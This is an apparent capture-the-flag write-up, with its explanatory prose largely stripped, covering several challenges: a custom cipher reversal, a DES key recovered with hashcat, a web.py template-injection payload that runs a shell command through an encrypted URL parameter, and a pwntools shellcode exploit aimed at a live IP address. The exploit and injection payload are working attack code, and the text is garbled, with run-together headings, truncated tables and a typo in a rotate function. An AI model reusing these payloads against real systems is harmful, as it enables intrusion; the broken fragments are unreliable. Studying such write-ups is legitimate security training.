435835L,425627161,4132249590L,545110560,2202526083L,1090133312,4120364277L,307
2740279L,1657550178,2380244109L,3514577873L,1542390107,2278665351L,2295898248L
,1871620975,598171939,2927150510L,3534153938L,475630108,3311412165L,504502302,
1917216882,749628716,286987281,3695095260L,4174732024L,1963654773,1373702481,3
543638483L,1787408234,1118932802,76958980,2353982860L,3284008131L,3672339162L,
989458234,935031095,2324902538L,4261971454L,3257710018L,361584917,821552944,34
22054091L,1956362100,2660180638L,1717205094,958608441,454368283,3972614892L,69
8968361,4074459890L,573974562,828812849,4094070260L,2241478277L,1203145543,212
3743102,1341329743,3981968365L,3843922405L,1174214981,2455565714L,3871818470L,
878815796,337383444,904979253,2951318703L,138779144,657533991,84345861,7868250
06,4011037167L,2000776311,2829392552L,3564845012L,222469645,2889045932L,368169
6731L,3173532605L,2157787776L,1702929253,244860174,2165076865L,3090106296L,209
4935420,3719292125L,2044275065,4232255484L,2252400006L,1678895716,2332195723L,
2408855183L,3796963298L,1796793963,712225322,314691346,2699067552L,3756291807L
,1601784927,2579739801L,2783413413L,1227804233,4181988345L,3617713367L,3881176
039L,2759249316L,1667071075,628801061,4081720307L,1741369703,4001552622L,27890
40038L,3341529543L,3227985856L,122459655,1847583342,2867759274L,3441801677L,16
28892769,215209740,3043875253L,1424362836,499696413,2479733907L,1126221379,347
2843470L,1906094961,1463604823,1264933963,3065447094L,2500879253L,1619502944,1
479924312,2195105922L,3927217642L,444880154,4212097531L,1454219094,3759840736L
,1047503422,115203846,2303322505L,619444004,2047079034,1097552961,3821029091L,
2441490065L,674766888,2639657373L,3588914901L,1177010758,1817473132,569176865,
1349533776,1518225498,3732226014L,648045862,1220511560,2988527538L,3505224400L
,908736566,2877276587L,3210990015L,2838778793L,1592264030,851211570,26298625,1
073670975,1433879637,951221560,3334142150L,4288269567L,2913083053L,1554224988,
38507010,1993352566,2729120418L,3898542056L,996714043,3036450996L,4043409905L,
168691722,3480103887L,1879964272,3593512406L,2102355069,194986251,1503957849,3
951418603L,64674563,1035303229,1147949124,1257510218,4158412535L,1841641837,20
73213819,1379652178,2669570975L,2382725006L,2555575704L,1767076969,3166243516L
,858602547,3127170490L,2018009208,3116240569L,2738510755L,1009004604,252251151
,2529867926L,2708588961L,3203569854L,3395891146L,796177967,2417452944L,3304155
844L,3434410188L,4204710138L,277503248,2630135964L,3922611945L,2609391259L,258
5358234L,324044307,1315067982,2813073063L,374833686,3014657715L]
xor_table = [40806489, 4046542995L, 2337878950L, 3878399079L, 449612036, 
776524271, 1059181995, 1764973087, 3196283120L, 4059530435L, 404769168, 
416194920, 865505623, 569110855, 4202362994L, 2884025964L, 1364091262, 
3967238082L, 3323511658L, 4191090596L, 1977398017, 2934017146L, 619849321, 
2598057311L, 2001658147, 3371447456L, 4101937135L, 1132035575, 4142164549L, 
95912149, 3823222592L, 1423799602]
flag = raw_input()
def to_bytes(d):
    res = []
    tmp = hex(d).replace('0x','').rjust(8,'0')
    for i in xrange(0,8,2):
        res.append(int(tmp[i:i+2],16))
    return res[::-1]
def ROR(d,n):
    return ( (d >> n) | (d > (32-n)) ) % 0x100000000
def en(data):   
    t1 = u32(data[0:4])   
    t2 = u32(data[4:8])   
    t3 = u32(data[8:12])   
    t4 = u32(data[12:16])
    t1 ^= 0x0C01A4D6E
    t2 ^= 0x0A4CB6636
    t3 ^= 0x5B0F5BA1
    t4 ^= 0x2B266926
    #print(hex(t1),hex(t2),hex(t3),hex(t4))
    for i in xrange(0,32,4):
        tt5 = to_bytes(t1)
        t5 = index_table1[tt5[0]] ^ index_table2[tt5[1]] ^ 
index_table3[tt5[2]] ^ index_table4[tt5[3]]
        tt6 = to_bytes(t2)
        t6 = index_table2[tt6[0]] ^ index_table3[tt6[1]] ^ 
index_table4[tt6[2]] ^ index_table1[tt6[3]]
        t3 ^=(xor_table[i] + t5 + t6)%0x100000000
        #print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
        t3 = ROR(t3,1)
        t4 = ROL(t4,1)
        #print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
        t4 ^= (xor_table[i+1] + t5 + t6 * 2)%0x100000000
        tt5 = to_bytes(t3)
        t5 = index_table1[tt5[0]] ^ index_table2[tt5[1]] ^ 
index_table3[tt5[2]] ^ index_table4[tt5[3]]
        tt6 = to_bytes(t4)
        t6 = index_table2[tt6[0]] ^ index_table3[tt6[1]] ^ 
index_table4[tt6[2]] ^ index_table1[tt6[3]]
        t1 ^= (xor_table[i+2] + t5 + t6)%0x100000000
        t1 = ROR(t1,1)
        t2 = ROL(t2,1)
        t2 ^= (xor_table[i+3] + t5 + t6 * 2)%0x100000000
        print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
    t3 ^= 0x0EF75CB8F
    t4 ^= 0x0A037222A
    t1 ^= 0x0BA69619A
    t2 ^= 0x60798932
    return p32(t3) + p32(t4) + p32(t1) + p32(t2)
def de(data):
    t3 = u32(data[0:4])   
    t4 = u32(data[4:8])   
    t1 = u32(data[8:12])   
    t2 = u32(data[12:16])
    t3 ^= 0x0EF75CB8F
    t4 ^= 0x0A037222A
    t1 ^= 0x0BA69619A
    t2 ^= 0x60798932
    for i in range(0,32,4)[::-1]:
        tt5 = to_bytes(t3)
        t5 = index_table1[tt5[0]] ^ index_table2[tt5[1]] ^ 
index_table3[tt5[2]] ^ index_table4[tt5[3]]
        tt6 = to_bytes(t4)
        t6 = index_table2[tt6[0]] ^ index_table3[tt6[1]] ^ 
index_table4[tt6[2]] ^ index_table1[tt6[3]]
        print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
        t2 ^= (xor_table[i+3] + t5 + t6 * 2)%0x100000000
        t2 = ROR(t2,1)
        t1 = ROL(t1,1)
        t1 ^= (xor_table[i+2] + t5 + t6)%0x100000000
        tt5 = to_bytes(t1)
        t5 = index_table1[tt5[0]] ^ index_table2[tt5[1]] ^ 
index_table3[tt5[2]] ^ index_table4[tt5[3]]
        tt6 = to_bytes(t2)
        t6 = index_table2[tt6[0]] ^ index_table3[tt6[1]] ^ 
index_table4[tt6[2]] ^ index_table1[tt6[3]]
        t4 ^= (xor_table[i+1] + t5 + t6 * 2)%0x100000000
        t3 = ROL(t3,1)
        t4 = ROR(t4,1)
        t3 ^=(xor_table[i] + t5 + t6)%0x100000000
        #print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
    t1 ^= 0x0C01A4D6E
    t2 ^= 0x0A4CB6636
    t3 ^= 0x5B0F5BA1
    t4 ^= 0x2B266926
    return p32(t1) + p32(t2) + p32(t3) + p32(t4)
Web
On my raddit
8LSBDES
2e7e305f2da018a2cf8208fa1fefc238 +  + 3ca92540eb2d0a42 
3ca92540eb2d0a42padding8hashcat
ldgonaroFLAG 
def xor_str(a,b):
    res = ''
    for i in xrange(16):
        res += chr(ord(a[i]) ^ ord(b[i]))
    return res
de_flag = [0x4F, 0x6F, 0xA7, 0x87, 0xE9, 0x51, 0x87, 0x64, 0x38, 0x2A, 0x46, 
0xE5, 0x4F, 0x21, 0x9E, 0x1C, 0xCD, 0x65, 0xE1, 0x9A, 0x4F, 0xCF, 0xDE, 0x52, 
0x09, 0xBF, 0x53, 0xC4, 0xB0, 0x95, 0x75, 0x31, 0xAC, 0x2F, 0xF4, 0x97, 0x1D, 
0xA5, 0x9A, 0x02, 0xA8, 0xFF, 0xAE, 0x2E, 0xB9, 0x70, 0xCC, 0x02]
de_c = ''
for i in de_flag:
    de_c += chr(i)
# a = en('a'*16)
# print('---')
# print(de(a))
print((xor_str(de_c[16:32],de(de_c[32:48]))))
# ~Exc3p7i0n-Ori3n7ed-Pr0grammin9~RoO0cks!!\o^_^o/
3ca92540eb2d0a42:0808080808080808:ldgonaro
Session..........: hashcat
Status...........: Cracked
Hash.Type........: DES (PT = $salt, key = $pass)
Hash.Target......: 3ca92540eb2d0a42:0808080808080808
f app.py E2272B36277C708BC21066647BC214B8 megnnaro
On my raddit2
https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/ web.pydb
from Crypto.Cipher import DES
key = 'ldgonaro'
def decrypt(decryptText):
  try:
      cipherX = DES.new(key, DES.MODE_ECB)
      str = decryptText.decode('hex')
      y = cipherX.decrypt(str)
      return y[0:ord(y[len(y)-1])*-1]
  except:
      return ""
print 
decrypt('2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c
95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42')
=>m=d&f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf
# coding: UTF-8
import os
import urllib
import urlparse
from Crypto.Cipher import DES
ENCRPYTION_KEY = 'megnnaro'
def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length
    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')
def decrypt(s):
    try:
        data = s.decode('hex')
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
        data = cipher.decrypt(data)
        data = data[:-ord(data[-1])]
        return dict(urlparse.parse_qsl(data))
    except Exception as e:
        print e.message
        return {}
MISC
Lumosity
EV3 Basic
LEGO EV3
81 xx 81 xx 84 xx 
32world
64bit ELFretf32shellcode24syscallIPFFFFFFFF
64bitone gadgetfs
print 
encrypt(urllib.urlencode({'m':'p','l':"${[].__class__.__base__.__subclasses__(
)[59]()._module.linecache.os.system('/read_flag > /tmp/fffza')}"}))
print encrypt(urllib.urlencode({'m':'d','f':'/tmp/fffza'}))
     0a 14 1e 28 32 3c 46 50 5a 64 6e 78 82 8c 96 a0
28   h  i  t  c  o  n  {  m  1  n  d  5  t  0  r  m
36   _  c  o  m  m  u  n  i  c  a  t  i  o  n  _  a
44   n  d  _  f  i  r  m  w  a  r  e  _  d  e  v  e
52   l  o  p  e  r  _  k  i  t  }
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
 0001: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
from pwn import *
#p = process('./32world')
p = remote('54.65.133.244', 8361)
context(bits = 32, arch = 'i386')
sc1 = '''
retf
'''
sc11 = asm('push 0x33')
sc1 = asm(sc1)
print sc1, len(sc1)
context(bits = 64, arch = 'amd64')
sc2 = asm('mov rax, fs:[rdx+0x900]; add rax, 0xf1147; call rax')
sc1 = sc11 + '\xe8\x10\x00\x00\x00' + sc2 + sc1
print sc1, len(sc1)
p.sendline(sc1)
p.interactive()